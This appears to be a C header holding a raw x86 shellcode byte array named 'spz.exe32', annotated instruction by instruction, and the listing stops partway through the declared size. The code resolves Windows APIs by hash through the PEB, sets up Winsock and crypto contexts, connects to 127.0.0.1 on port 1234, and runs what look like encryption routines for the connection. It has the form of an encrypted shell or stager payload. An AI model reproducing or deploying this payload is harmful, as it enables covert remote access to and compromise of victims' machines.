
#define spz.exe32_SIZE 5699

char spz.exe32[]= {
  /* 0000 */ "\x55"                                     /* push ebp                         */
  /* 0001 */ "\x8d\x6c\x24\x88"                         /* lea ebp, [esp-0x78]              */
  /* 0005 */ "\xb8\x1c\x16\x00\x00"                     /* mov eax, 0x161c                  */
  /* 000A */ "\xe8\xd1\x15\x00\x00"                     /* call 0x15e0                      */
  /* 000F */ "\x53"                                     /* push ebx                         */
  /* 0010 */ "\x56"                                     /* push esi                         */
  /* 0011 */ "\x57"                                     /* push edi                         */
  /* 0012 */ "\x33\xdb"                                 /* xor ebx, ebx                     */
  /* 0014 */ "\x32\xc0"                                 /* xor al, al                       */
  /* 0016 */ "\x8d\xbd\x5c\xea\xff\xff"                 /* lea edi, [ebp-0x15a4]            */
  /* 001C */ "\xb9\xf8\x13\x00\x00"                     /* mov ecx, 0x13f8                  */
  /* 0021 */ "\x68\xed\x28\x3b\x7c"                     /* push 0x7c3b28ed                  */
  /* 0026 */ "\xc7\x45\x70\x77\x73\x32\x5f"             /* mov dword [ebp+0x70], 0x5f327377 */
  /* 002D */ "\x66\xc7\x45\x74\x33\x32"                 /* mov word [ebp+0x74], 0x3233      */
  /* 0033 */ "\x88\x5d\x76"                             /* mov [ebp+0x76], bl               */
  /* 0036 */ "\xc7\x45\x64\x61\x64\x76\x61"             /* mov dword [ebp+0x64], 0x61766461 */
  /* 003D */ "\xc7\x45\x68\x70\x69\x33\x32"             /* mov dword [ebp+0x68], 0x32336970 */
  /* 0044 */ "\x88\x5d\x6c"                             /* mov [ebp+0x6c], bl               */
  /* 0047 */ "\xc7\x45\xf4\xa9\x3e\x1d\x9b"             /* mov dword [ebp-0xc], 0x9b1d3ea9  */
  /* 004E */ "\xc7\x45\xf8\xbf\x65\xfa\xe6"             /* mov dword [ebp-0x8], 0xe6fa65bf  */
  /* 0055 */ "\xc7\x45\xfc\x0c\xee\xee\x0b"             /* mov dword [ebp-0x4], 0xbeeee0c   */
  /* 005C */ "\xc7\x45\x00\x5f\x4f\xf7\xd7"             /* mov dword [ebp], 0xd7f74f5f      */
  /* 0063 */ "\xc7\x45\x04\x55\x3f\xe7\xe0"             /* mov dword [ebp+0x4], 0xe0e73f55  */
  /* 006A */ "\xc7\x45\x08\x3b\xb3\x74\x58"             /* mov dword [ebp+0x8], 0x5874b33b  */
  /* 0071 */ "\xc7\x45\x0c\xd1\xd8\xa0\xb6"             /* mov dword [ebp+0xc], 0xb6a0d8d1  */
  /* 0078 */ "\xc7\x45\x10\xc6\x8f\x22\x09"             /* mov dword [ebp+0x10], 0x9228fc6  */
  /* 007F */ "\xc7\x45\x14\xf0\x88\xf1\xc0"             /* mov dword [ebp+0x14], 0xc0f188f0 */
  /* 0086 */ "\xc7\x45\x18\x63\xd1\xc0\xa7"             /* mov dword [ebp+0x18], 0xa7c0d163 */
  /* 008D */ "\xc7\x45\x1c\xa5\xef\x08\x26"             /* mov dword [ebp+0x1c], 0x2608efa5 */
  /* 0094 */ "\xc7\x45\x20\x52\x6e\xea\x9f"             /* mov dword [ebp+0x20], 0x9fea6e52 */
  /* 009B */ "\xc7\x45\x24\x63\x2c\x68\xb4"             /* mov dword [ebp+0x24], 0xb4682c63 */
  /* 00A2 */ "\xc7\x45\x28\xc6\xb2\x1b\xca"             /* mov dword [ebp+0x28], 0xca1bb2c6 */
  /* 00A9 */ "\xc7\x45\x2c\x3e\xc4\x7c\x72"             /* mov dword [ebp+0x2c], 0x727cc43e */
  /* 00B0 */ "\xc7\x45\x30\x34\x03\x92\x9d"             /* mov dword [ebp+0x30], 0x9d920334 */
  /* 00B7 */ "\xc7\x45\x34\xb2\xf1\x0d\xb5"             /* mov dword [ebp+0x34], 0xb50df1b2 */
  /* 00BE */ "\xc7\x45\x38\x6a\x11\xd3\x3d"             /* mov dword [ebp+0x38], 0x3dd3116a */
  /* 00C5 */ "\xc7\x45\x3c\x7c\x11\x7b\x3b"             /* mov dword [ebp+0x3c], 0x3b7b117c */
  /* 00CC */ "\xc7\x45\x40\xad\x71\x29\xce"             /* mov dword [ebp+0x40], 0xce2971ad */
  /* 00D3 */ "\xc7\x45\x44\xce\x89\x45\x42"             /* mov dword [ebp+0x44], 0x424589ce */
  /* 00DA */ "\xc7\x45\x48\xbe\x26\x97\x92"             /* mov dword [ebp+0x48], 0x929726be */
  /* 00E1 */ "\xc7\x45\x4c\x3f\x06\x2c\x27"             /* mov dword [ebp+0x4c], 0x272c063f */
  /* 00E8 */ "\xc7\x45\x50\x16\x05\xef\x26"             /* mov dword [ebp+0x50], 0x26ef0516 */
  /* 00EF */ "\xc7\x45\x54\x91\xe9\xe0\xb0"             /* mov dword [ebp+0x54], 0xb0e0e991 */
  /* 00F6 */ "\xc7\x45\x58\x99\x47\x90\x86"             /* mov dword [ebp+0x58], 0x86904799 */
  /* 00FD */ "\xc7\x45\x5c\x22\xd5\x78\xbd"             /* mov dword [ebp+0x5c], 0xbd78d522 */
  /* 0104 */ "\xc7\x45\x60\x33\xe0\x35\xb6"             /* mov dword [ebp+0x60], 0xb635e033 */
  /* 010B */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 010D */ "\xe8\xe8\x00\x00\x00"                     /* call 0x1fa                       */
  /* 0112 */ "\x8b\xf0"                                 /* mov esi, eax                     */
  /* 0114 */ "\x59"                                     /* pop ecx                          */
  /* 0115 */ "\x8d\x45\x70"                             /* lea eax, [ebp+0x70]              */
  /* 0118 */ "\x50"                                     /* push eax                         */
  /* 0119 */ "\xff\xd6"                                 /* call esi                         */
  /* 011B */ "\x8d\x45\x64"                             /* lea eax, [ebp+0x64]              */
  /* 011E */ "\x50"                                     /* push eax                         */
  /* 011F */ "\xff\xd6"                                 /* call esi                         */
  /* 0121 */ "\x33\xf6"                                 /* xor esi, esi                     */
  /* 0123 */ "\xff\x74\x35\xf4"                         /* push dword [ebp+esi-0xc]         */
  /* 0127 */ "\xe8\xce\x00\x00\x00"                     /* call 0x1fa                       */
  /* 012C */ "\x89\x84\x35\x5c\xea\xff\xff"             /* mov [ebp+esi-0x15a4], eax        */
  /* 0133 */ "\x83\xc6\x04"                             /* add esi, 0x4                     */
  /* 0136 */ "\x59"                                     /* pop ecx                          */
  /* 0137 */ "\x83\xfe\x70"                             /* cmp esi, 0x70                    */
  /* 013A */ "\x72\xe7"                                 /* jb 0x123                         */
  /* 013C */ "\x8d\x85\x54\xfe\xff\xff"                 /* lea eax, [ebp-0x1ac]             */
  /* 0142 */ "\x50"                                     /* push eax                         */
  /* 0143 */ "\x68\x02\x02\x00\x00"                     /* push 0x202                       */
  /* 0148 */ "\xff\x95\xbc\xea\xff\xff"                 /* call dword [ebp-0x1544]          */
  /* 014E */ "\x68\x40\x00\x00\xf0"                     /* push 0xf0000040                  */
  /* 0153 */ "\x6a\x18"                                 /* push 0x18                        */
  /* 0155 */ "\x53"                                     /* push ebx                         */
  /* 0156 */ "\x53"                                     /* push ebx                         */
  /* 0157 */ "\x8d\x85\x20\xf3\xff\xff"                 /* lea eax, [ebp-0xce0]             */
  /* 015D */ "\x50"                                     /* push eax                         */
  /* 015E */ "\x89\x9d\x20\xf3\xff\xff"                 /* mov [ebp-0xce0], ebx             */
  /* 0164 */ "\xff\x95\xc0\xea\xff\xff"                 /* call dword [ebp-0x1540]          */
  /* 016A */ "\x6a\x06"                                 /* push 0x6                         */
  /* 016C */ "\x6a\x01"                                 /* push 0x1                         */
  /* 016E */ "\x6a\x02"                                 /* push 0x2                         */
  /* 0170 */ "\xff\x95\x98\xea\xff\xff"                 /* call dword [ebp-0x1568]          */
  /* 0176 */ "\x6a\x02"                                 /* push 0x2                         */
  /* 0178 */ "\xb9\x04\xd2\x00\x00"                     /* mov ecx, 0xd204                  */
  /* 017D */ "\x66\x89\x4d\xe6"                         /* mov [ebp-0x1a], cx               */
  /* 0181 */ "\x59"                                     /* pop ecx                          */
  /* 0182 */ "\x66\x89\x4d\xe4"                         /* mov [ebp-0x1c], cx               */
  /* 0186 */ "\x6a\x10"                                 /* push 0x10                        */
  /* 0188 */ "\x8d\x4d\xe4"                             /* lea ecx, [ebp-0x1c]              */
  /* 018B */ "\x51"                                     /* push ecx                         */
  /* 018C */ "\x50"                                     /* push eax                         */
  /* 018D */ "\x89\x85\xec\xf2\xff\xff"                 /* mov [ebp-0xd14], eax             */
  /* 0193 */ "\xc7\x45\xe8\x7f\x00\x00\x01"             /* mov dword [ebp-0x18], 0x100007f  */
  /* 019A */ "\xff\x95\x9c\xea\xff\xff"                 /* call dword [ebp-0x1564]          */
  /* 01A0 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 01A2 */ "\x75\x1a"                                 /* jnz 0x1be                        */
  /* 01A4 */ "\x8d\x85\x5c\xea\xff\xff"                 /* lea eax, [ebp-0x15a4]            */
  /* 01AA */ "\x50"                                     /* push eax                         */
  /* 01AB */ "\xe8\x4d\x05\x00\x00"                     /* call 0x6fd                       */
  /* 01B0 */ "\x8d\x85\x5c\xea\xff\xff"                 /* lea eax, [ebp-0x15a4]            */
  /* 01B6 */ "\x50"                                     /* push eax                         */
  /* 01B7 */ "\xe8\xd2\x09\x00\x00"                     /* call 0xb8e                       */
  /* 01BC */ "\x59"                                     /* pop ecx                          */
  /* 01BD */ "\x59"                                     /* pop ecx                          */
  /* 01BE */ "\xff\xb5\xec\xf2\xff\xff"                 /* push dword [ebp-0xd14]           */
  /* 01C4 */ "\xff\x95\xa8\xea\xff\xff"                 /* call dword [ebp-0x1558]          */
  /* 01CA */ "\x53"                                     /* push ebx                         */
  /* 01CB */ "\xff\xb5\x20\xf3\xff\xff"                 /* push dword [ebp-0xce0]           */
  /* 01D1 */ "\xff\x95\xc8\xea\xff\xff"                 /* call dword [ebp-0x1538]          */
  /* 01D7 */ "\x5f"                                     /* pop edi                          */
  /* 01D8 */ "\x5e"                                     /* pop esi                          */
  /* 01D9 */ "\x5b"                                     /* pop ebx                          */
  /* 01DA */ "\x83\xc5\x78"                             /* add ebp, 0x78                    */
  /* 01DD */ "\xc9"                                     /* leave                            */
  /* 01DE */ "\xc3"                                     /* ret                              */
  
  /* 01DF */ "\x8b\x54\x24\x04"                         /* mov edx, [esp+0x4]               */
  /* 01E3 */ "\x33\xc0"                                 /* xor eax, eax                     */
  /* 01E5 */ "\xeb\x0c"                                 /* jmp 0x1f3                        */
  /* 01E7 */ "\x0f\xbe\xc9"                             /* movsx ecx, cl                    */
  /* 01EA */ "\x83\xc9\x20"                             /* or ecx, 0x20                     */
  /* 01ED */ "\xc1\xc8\x0d"                             /* ror eax, 0xd                     */
  /* 01F0 */ "\x03\xc1"                                 /* add eax, ecx                     */
  /* 01F2 */ "\x42"                                     /* inc edx                          */
  /* 01F3 */ "\x8a\x0a"                                 /* mov cl, [edx]                    */
  /* 01F5 */ "\x84\xc9"                                 /* test cl, cl                      */
  /* 01F7 */ "\x75\xee"                                 /* jnz 0x1e7                        */
  /* 01F9 */ "\xc3"                                     /* ret                              */
  
  /* 01FA */ "\x55"                                     /* push ebp                         */
  /* 01FB */ "\x8d\x6c\x24\x8c"                         /* lea ebp, [esp-0x74]              */
  /* 01FF */ "\x81\xec\xdc\x00\x00\x00"                 /* sub esp, 0xdc                    */
  /* 0205 */ "\x64\xa1\x30\x00\x00\x00"                 /* mov eax, [fs:0x30]               */
  /* 020B */ "\x8b\x40\x0c"                             /* mov eax, [eax+0xc]               */
  /* 020E */ "\x8b\x40\x0c"                             /* mov eax, [eax+0xc]               */
  /* 0211 */ "\x83\x65\x70\x00"                         /* and dword [ebp+0x70], 0x0        */
  /* 0215 */ "\x57"                                     /* push edi                         */
  /* 0216 */ "\x8b\x78\x18"                             /* mov edi, [eax+0x18]              */
  /* 0219 */ "\x89\x45\x68"                             /* mov [ebp+0x68], eax              */
  /* 021C */ "\x85\xff"                                 /* test edi, edi                    */
  /* 021E */ "\x0f\x84\x34\x01\x00\x00"                 /* jz 0x358                         */
  /* 0224 */ "\x53"                                     /* push ebx                         */
  /* 0225 */ "\x56"                                     /* push esi                         */
  /* 0226 */ "\x8b\x47\x3c"                             /* mov eax, [edi+0x3c]              */
  /* 0229 */ "\x8d\x44\x38\x78"                         /* lea eax, [eax+edi+0x78]          */
  /* 022D */ "\x8b\x30"                                 /* mov esi, [eax]                   */
  /* 022F */ "\x89\x45\x60"                             /* mov [ebp+0x60], eax              */
  /* 0232 */ "\x85\xf6"                                 /* test esi, esi                    */
  /* 0234 */ "\x0f\x84\x09\x01\x00\x00"                 /* jz 0x343                         */
  /* 023A */ "\x03\xf7"                                 /* add esi, edi                     */
  /* 023C */ "\x8b\x46\x18"                             /* mov eax, [esi+0x18]              */
  /* 023F */ "\x8b\x5e\x20"                             /* mov ebx, [esi+0x20]              */
  /* 0242 */ "\x89\x45\x6c"                             /* mov [ebp+0x6c], eax              */
  /* 0245 */ "\x8b\x46\x1c"                             /* mov eax, [esi+0x1c]              */
  /* 0248 */ "\x03\xc7"                                 /* add eax, edi                     */
  /* 024A */ "\x89\x45\x58"                             /* mov [ebp+0x58], eax              */
  /* 024D */ "\x8b\x46\x24"                             /* mov eax, [esi+0x24]              */
  /* 0250 */ "\x03\xc7"                                 /* add eax, edi                     */
  /* 0252 */ "\x89\x45\x64"                             /* mov [ebp+0x64], eax              */
  /* 0255 */ "\x8b\x46\x0c"                             /* mov eax, [esi+0xc]               */
  /* 0258 */ "\x03\xc7"                                 /* add eax, edi                     */
  /* 025A */ "\x50"                                     /* push eax                         */
  /* 025B */ "\x03\xdf"                                 /* add ebx, edi                     */
  /* 025D */ "\xe8\x7d\xff\xff\xff"                     /* call 0x1df                       */
  /* 0262 */ "\x89\x45\x5c"                             /* mov [ebp+0x5c], eax              */
  /* 0265 */ "\x8b\x45\x6c"                             /* mov eax, [ebp+0x6c]              */
  /* 0268 */ "\x59"                                     /* pop ecx                          */
  /* 0269 */ "\x8d\x5c\x83\xfc"                         /* lea ebx, [ebx+eax*4-0x4]         */
  /* 026D */ "\x8b\x03"                                 /* mov eax, [ebx]                   */
  /* 026F */ "\x03\xc7"                                 /* add eax, edi                     */
  /* 0271 */ "\x50"                                     /* push eax                         */
  /* 0272 */ "\xe8\x68\xff\xff\xff"                     /* call 0x1df                       */
  /* 0277 */ "\x03\x45\x5c"                             /* add eax, [ebp+0x5c]              */
  /* 027A */ "\x59"                                     /* pop ecx                          */
  /* 027B */ "\x3b\x45\x7c"                             /* cmp eax, [ebp+0x7c]              */
  /* 027E */ "\x74\x1b"                                 /* jz 0x29b                         */
  /* 0280 */ "\xff\x4d\x6c"                             /* dec dword [ebp+0x6c]             */
  /* 0283 */ "\x83\xeb\x04"                             /* sub ebx, 0x4                     */
  /* 0286 */ "\x83\x7d\x6c\x00"                         /* cmp dword [ebp+0x6c], 0x0        */
  /* 028A */ "\x0f\x84\xac\x00\x00\x00"                 /* jz 0x33c                         */
  /* 0290 */ "\x83\x7d\x70\x00"                         /* cmp dword [ebp+0x70], 0x0        */
  /* 0294 */ "\x74\xd7"                                 /* jz 0x26d                         */
  /* 0296 */ "\xe9\xbb\x00\x00\x00"                     /* jmp 0x356                        */
  /* 029B */ "\x8b\x4d\x6c"                             /* mov ecx, [ebp+0x6c]              */
  /* 029E */ "\x8b\x45\x64"                             /* mov eax, [ebp+0x64]              */
  /* 02A1 */ "\x0f\xb7\x44\x48\xfe"                     /* movzx eax, word [eax+ecx*2-0x2]  */
  /* 02A6 */ "\x8b\x4d\x58"                             /* mov ecx, [ebp+0x58]              */
  /* 02A9 */ "\x8b\x0c\x81"                             /* mov ecx, [ecx+eax*4]             */
  /* 02AC */ "\x03\xcf"                                 /* add ecx, edi                     */
  /* 02AE */ "\x89\x4d\x70"                             /* mov [ebp+0x70], ecx              */
  /* 02B1 */ "\x3b\xce"                                 /* cmp ecx, esi                     */
  /* 02B3 */ "\x0f\x82\x86\x00\x00\x00"                 /* jb 0x33f                         */
  /* 02B9 */ "\x8b\x45\x60"                             /* mov eax, [ebp+0x60]              */
  /* 02BC */ "\x8b\x40\x04"                             /* mov eax, [eax+0x4]               */
  /* 02BF */ "\x03\xc6"                                 /* add eax, esi                     */
  /* 02C1 */ "\x3b\xc8"                                 /* cmp ecx, eax                     */
  /* 02C3 */ "\x73\x7a"                                 /* jae 0x33f                        */
  /* 02C5 */ "\x33\xc0"                                 /* xor eax, eax                     */
  /* 02C7 */ "\x38\x01"                                 /* cmp [ecx], al                    */
  /* 02C9 */ "\x74\x1d"                                 /* jz 0x2e8                         */
  /* 02CB */ "\x8d\x7d\x18"                             /* lea edi, [ebp+0x18]              */
  /* 02CE */ "\x8b\xf1"                                 /* mov esi, ecx                     */
  /* 02D0 */ "\x2b\xf9"                                 /* sub edi, ecx                     */
  /* 02D2 */ "\x83\xf8\x3c"                             /* cmp eax, 0x3c                    */
  /* 02D5 */ "\x73\x11"                                 /* jae 0x2e8                        */
  /* 02D7 */ "\x8a\x16"                                 /* mov dl, [esi]                    */
  /* 02D9 */ "\x88\x14\x37"                             /* mov [edi+esi], dl                */
  /* 02DC */ "\x80\xfa\x2e"                             /* cmp dl, 0x2e                     */
  /* 02DF */ "\x74\x07"                                 /* jz 0x2e8                         */
  /* 02E1 */ "\x40"                                     /* inc eax                          */
  /* 02E2 */ "\x46"                                     /* inc esi                          */
  /* 02E3 */ "\x80\x3e\x00"                             /* cmp byte [esi], 0x0              */
  /* 02E6 */ "\x75\xea"                                 /* jnz 0x2d2                        */
  /* 02E8 */ "\xc6\x44\x05\x19\x44"                     /* mov byte [ebp+eax+0x19], 0x44    */
  /* 02ED */ "\xc6\x44\x05\x1a\x4c"                     /* mov byte [ebp+eax+0x1a], 0x4c    */
  /* 02F2 */ "\xc6\x44\x05\x1b\x4c"                     /* mov byte [ebp+eax+0x1b], 0x4c    */
  /* 02F7 */ "\xc6\x44\x05\x1c\x00"                     /* mov byte [ebp+eax+0x1c], 0x0     */
  /* 02FC */ "\x33\xd2"                                 /* xor edx, edx                     */
  /* 02FE */ "\x8d\x4c\x08\x01"                         /* lea ecx, [eax+ecx+0x1]           */
  /* 0302 */ "\xeb\x0b"                                 /* jmp 0x30f                        */
  /* 0304 */ "\x83\xfa\x7f"                             /* cmp edx, 0x7f                    */
  /* 0307 */ "\x73\x0c"                                 /* jae 0x315                        */
  /* 0309 */ "\x88\x44\x15\x98"                         /* mov [ebp+edx-0x68], al           */
  /* 030D */ "\x42"                                     /* inc edx                          */
  /* 030E */ "\x41"                                     /* inc ecx                          */
  /* 030F */ "\x8a\x01"                                 /* mov al, [ecx]                    */
  /* 0311 */ "\x84\xc0"                                 /* test al, al                      */
  /* 0313 */ "\x75\xef"                                 /* jnz 0x304                        */
  /* 0315 */ "\x8d\x45\x98"                             /* lea eax, [ebp-0x68]              */
  /* 0318 */ "\x50"                                     /* push eax                         */
  /* 0319 */ "\xc6\x44\x15\x98\x00"                     /* mov byte [ebp+edx-0x68], 0x0     */
  /* 031E */ "\xe8\xbc\xfe\xff\xff"                     /* call 0x1df                       */
  /* 0323 */ "\x8b\xf0"                                 /* mov esi, eax                     */
  /* 0325 */ "\x8d\x45\x18"                             /* lea eax, [ebp+0x18]              */
  /* 0328 */ "\x50"                                     /* push eax                         */
  /* 0329 */ "\xe8\xb1\xfe\xff\xff"                     /* call 0x1df                       */
  /* 032E */ "\x03\xf0"                                 /* add esi, eax                     */
  /* 0330 */ "\x56"                                     /* push esi                         */
  /* 0331 */ "\xe8\xc4\xfe\xff\xff"                     /* call 0x1fa                       */
  /* 0336 */ "\x83\xc4\x0c"                             /* add esp, 0xc                     */
  /* 0339 */ "\x89\x45\x70"                             /* mov [ebp+0x70], eax              */
  /* 033C */ "\x8b\x4d\x70"                             /* mov ecx, [ebp+0x70]              */
  /* 033F */ "\x85\xc9"                                 /* test ecx, ecx                    */
  /* 0341 */ "\x75\x13"                                 /* jnz 0x356                        */
  /* 0343 */ "\x8b\x45\x68"                             /* mov eax, [ebp+0x68]              */
  /* 0346 */ "\x8b\x00"                                 /* mov eax, [eax]                   */
  /* 0348 */ "\x8b\x78\x18"                             /* mov edi, [eax+0x18]              */
  /* 034B */ "\x89\x45\x68"                             /* mov [ebp+0x68], eax              */
  /* 034E */ "\x85\xff"                                 /* test edi, edi                    */
  /* 0350 */ "\x0f\x85\xd0\xfe\xff\xff"                 /* jnz 0x226                        */
  /* 0356 */ "\x5e"                                     /* pop esi                          */
  /* 0357 */ "\x5b"                                     /* pop ebx                          */
  /* 0358 */ "\x8b\x45\x70"                             /* mov eax, [ebp+0x70]              */
  /* 035B */ "\x5f"                                     /* pop edi                          */
  /* 035C */ "\x83\xc5\x74"                             /* add ebp, 0x74                    */
  /* 035F */ "\xc9"                                     /* leave                            */
  /* 0360 */ "\xc3"                                     /* ret                              */
  /* 0361 */ "\xff\x74\x24\x08"                         /* push dword [esp+0x8]             */
  /* 0365 */ "\x8b\x44\x24\x08"                         /* mov eax, [esp+0x8]               */
  /* 0369 */ "\xff\x74\x24\x10"                         /* push dword [esp+0x10]            */
  /* 036D */ "\xff\xb0\xc4\x08\x00\x00"                 /* push dword [eax+0x8c4]           */
  /* 0373 */ "\xff\x50\x68"                             /* call dword [eax+0x68]            */
  /* 0376 */ "\xc3"                                     /* ret                              */
  /* 0377 */ "\x55"                                     /* push ebp                         */
  /* 0378 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 037A */ "\x81\xec\xf4\x00\x00\x00"                 /* sub esp, 0xf4                    */
  /* 0380 */ "\x56"                                     /* push esi                         */
  /* 0381 */ "\x57"                                     /* push edi                         */
  /* 0382 */ "\x8d\x85\x0c\xff\xff\xff"                 /* lea eax, [ebp-0xf4]              */
  /* 0388 */ "\x6a\x20"                                 /* push 0x20                        */
  /* 038A */ "\x50"                                     /* push eax                         */
  /* 038B */ "\xe8\x29\x0b\x00\x00"                     /* call 0xeb9                       */
  /* 0390 */ "\x8b\x45\x08"                             /* mov eax, [ebp+0x8]               */
  /* 0393 */ "\x05\xf8\x08\x00\x00"                     /* add eax, 0x8f8                   */
  /* 0398 */ "\x6a\x10"                                 /* push 0x10                        */
  /* 039A */ "\x50"                                     /* push eax                         */
  /* 039B */ "\x8d\x85\x0c\xff\xff\xff"                 /* lea eax, [ebp-0xf4]              */
  /* 03A1 */ "\x50"                                     /* push eax                         */
  /* 03A2 */ "\xe8\x39\x0b\x00\x00"                     /* call 0xee0                       */
  /* 03A7 */ "\xff\x75\x10"                             /* push dword [ebp+0x10]            */
  /* 03AA */ "\x8d\x85\x0c\xff\xff\xff"                 /* lea eax, [ebp-0xf4]              */
  /* 03B0 */ "\xff\x75\x0c"                             /* push dword [ebp+0xc]             */
  /* 03B3 */ "\x50"                                     /* push eax                         */
  /* 03B4 */ "\xe8\x27\x0b\x00\x00"                     /* call 0xee0                       */
  /* 03B9 */ "\x8d\x85\x0c\xff\xff\xff"                 /* lea eax, [ebp-0xf4]              */
  /* 03BF */ "\x50"                                     /* push eax                         */
  /* 03C0 */ "\x8d\x45\xe0"                             /* lea eax, [ebp-0x20]              */
  /* 03C3 */ "\x50"                                     /* push eax                         */
  /* 03C4 */ "\xe8\x55\x0b\x00\x00"                     /* call 0xf1e                       */
  /* 03C9 */ "\x8b\x7d\x14"                             /* mov edi, [ebp+0x14]              */
  /* 03CC */ "\x83\xc4\x28"                             /* add esp, 0x28                    */
  /* 03CF */ "\x6a\x0c"                                 /* push 0xc                         */
  /* 03D1 */ "\x59"                                     /* pop ecx                          */
  /* 03D2 */ "\x8d\x75\xe0"                             /* lea esi, [ebp-0x20]              */
  /* 03D5 */ "\xf3\xa4"                                 /* rep movsb                        */
  /* 03D7 */ "\x5f"                                     /* pop edi                          */
  /* 03D8 */ "\x5e"                                     /* pop esi                          */
  /* 03D9 */ "\xc9"                                     /* leave                            */
  /* 03DA */ "\xc3"                                     /* ret                              */
  /* 03DB */ "\x57"                                     /* push edi                         */
  /* 03DC */ "\x8b\x7c\x24\x10"                         /* mov edi, [esp+0x10]              */
  /* 03E0 */ "\x83\xff\x10"                             /* cmp edi, 0x10                    */
  /* 03E3 */ "\x76\x03"                                 /* jbe 0x3e8                        */
  /* 03E5 */ "\x6a\x10"                                 /* push 0x10                        */
  /* 03E7 */ "\x5f"                                     /* pop edi                          */
  /* 03E8 */ "\x85\xff"                                 /* test edi, edi                    */
  /* 03EA */ "\x74\x17"                                 /* jz 0x403                         */
  /* 03EC */ "\x8b\x4c\x24\x08"                         /* mov ecx, [esp+0x8]               */
  /* 03F0 */ "\x8b\x54\x24\x0c"                         /* mov edx, [esp+0xc]               */
  /* 03F4 */ "\x56"                                     /* push esi                         */
  /* 03F5 */ "\x2b\xd1"                                 /* sub edx, ecx                     */
  /* 03F7 */ "\x8b\xf7"                                 /* mov esi, edi                     */
  /* 03F9 */ "\x8a\x04\x0a"                             /* mov al, [edx+ecx]                */
  /* 03FC */ "\x30\x01"                                 /* xor [ecx], al                    */
  /* 03FE */ "\x41"                                     /* inc ecx                          */
  /* 03FF */ "\x4e"                                     /* dec esi                          */
  /* 0400 */ "\x75\xf7"                                 /* jnz 0x3f9                        */
  /* 0402 */ "\x5e"                                     /* pop esi                          */
  /* 0403 */ "\x8b\xc7"                                 /* mov eax, edi                     */
  /* 0405 */ "\x5f"                                     /* pop edi                          */
  /* 0406 */ "\xc3"                                     /* ret                              */
  /* 0407 */ "\x6a\x0f"                                 /* push 0xf                         */
  /* 0409 */ "\x59"                                     /* pop ecx                          */
  /* 040A */ "\x8b\x44\x24\x04"                         /* mov eax, [esp+0x4]               */
  /* 040E */ "\xfe\x04\x08"                             /* inc byte [eax+ecx]               */
  /* 0411 */ "\x75\x03"                                 /* jnz 0x416                        */
  /* 0413 */ "\x49"                                     /* dec ecx                          */
  /* 0414 */ "\x79\xf4"                                 /* jns 0x40a                        */
  /* 0416 */ "\xc3"                                     /* ret                              */
  /* 0417 */ "\x55"                                     /* push ebp                         */
  /* 0418 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 041A */ "\x83\xec\x14"                             /* sub esp, 0x14                    */
  /* 041D */ "\x8b\x45\x10"                             /* mov eax, [ebp+0x10]              */
  /* 0420 */ "\x8b\x4d\x0c"                             /* mov ecx, [ebp+0xc]               */
  /* 0423 */ "\x89\x45\xfc"                             /* mov [ebp-0x4], eax               */
  /* 0426 */ "\x89\x4d\x10"                             /* mov [ebp+0x10], ecx              */
  /* 0429 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 042B */ "\x74\x53"                                 /* jz 0x480                         */
  /* 042D */ "\x53"                                     /* push ebx                         */
  /* 042E */ "\x8b\x5d\x08"                             /* mov ebx, [ebp+0x8]               */
  /* 0431 */ "\x8d\x83\x08\x11\x00\x00"                 /* lea eax, [ebx+0x1108]            */
  /* 0437 */ "\x56"                                     /* push esi                         */
  /* 0438 */ "\x57"                                     /* push edi                         */
  /* 0439 */ "\x89\x45\x0c"                             /* mov [ebp+0xc], eax               */
  /* 043C */ "\x81\xc3\xe8\x08\x00\x00"                 /* add ebx, 0x8e8                   */
  /* 0442 */ "\x6a\x10"                                 /* push 0x10                        */
  /* 0444 */ "\x59"                                     /* pop ecx                          */
  /* 0445 */ "\x6a\x01"                                 /* push 0x1                         */
  /* 0447 */ "\xff\x75\x0c"                             /* push dword [ebp+0xc]             */
  /* 044A */ "\x8d\x45\xec"                             /* lea eax, [ebp-0x14]              */
  /* 044D */ "\x50"                                     /* push eax                         */
  /* 044E */ "\x8d\x7d\xec"                             /* lea edi, [ebp-0x14]              */
  /* 0451 */ "\x8b\xf3"                                 /* mov esi, ebx                     */
  /* 0453 */ "\x50"                                     /* push eax                         */
  /* 0454 */ "\xf3\xa4"                                 /* rep movsb                        */
  /* 0456 */ "\xe8\x15\x0d\x00\x00"                     /* call 0x1170                      */
  /* 045B */ "\xff\x75\xfc"                             /* push dword [ebp-0x4]             */
  /* 045E */ "\x8d\x45\xec"                             /* lea eax, [ebp-0x14]              */
  /* 0461 */ "\x50"                                     /* push eax                         */
  /* 0462 */ "\xff\x75\x10"                             /* push dword [ebp+0x10]            */
  /* 0465 */ "\xe8\x71\xff\xff\xff"                     /* call 0x3db                       */
  /* 046A */ "\x53"                                     /* push ebx                         */
  /* 046B */ "\x8b\xd0"                                 /* mov edx, eax                     */
  /* 046D */ "\xe8\x95\xff\xff\xff"                     /* call 0x407                       */
  /* 0472 */ "\x01\x55\x10"                             /* add [ebp+0x10], edx              */
  /* 0475 */ "\x83\xc4\x20"                             /* add esp, 0x20                    */
  /* 0478 */ "\x29\x55\xfc"                             /* sub [ebp-0x4], edx               */
  /* 047B */ "\x75\xc5"                                 /* jnz 0x442                        */
  /* 047D */ "\x5f"                                     /* pop edi                          */
  /* 047E */ "\x5e"                                     /* pop esi                          */
  /* 047F */ "\x5b"                                     /* pop ebx                          */
  /* 0480 */ "\xc9"                                     /* leave                            */
  /* 0481 */ "\xc3"                                     /* ret                              */
  /* 0482 */ "\x55"                                     /* push ebp                         */
  /* 0483 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 0485 */ "\x83\xec\x0c"                             /* sub esp, 0xc                     */
  /* 0488 */ "\x83\x7d\x14\x01"                         /* cmp dword [ebp+0x14], 0x1        */
  /* 048C */ "\x53"                                     /* push ebx                         */
  /* 048D */ "\x8b\x5d\x10"                             /* mov ebx, [ebp+0x10]              */
  /* 0490 */ "\x56"                                     /* push esi                         */
  /* 0491 */ "\x75\x2d"                                 /* jnz 0x4c0                        */
  /* 0493 */ "\x8b\x75\x0c"                             /* mov esi, [ebp+0xc]               */
  /* 0496 */ "\x57"                                     /* push edi                         */
  /* 0497 */ "\x8d\x45\xf4"                             /* lea eax, [ebp-0xc]               */
  /* 049A */ "\x50"                                     /* push eax                         */
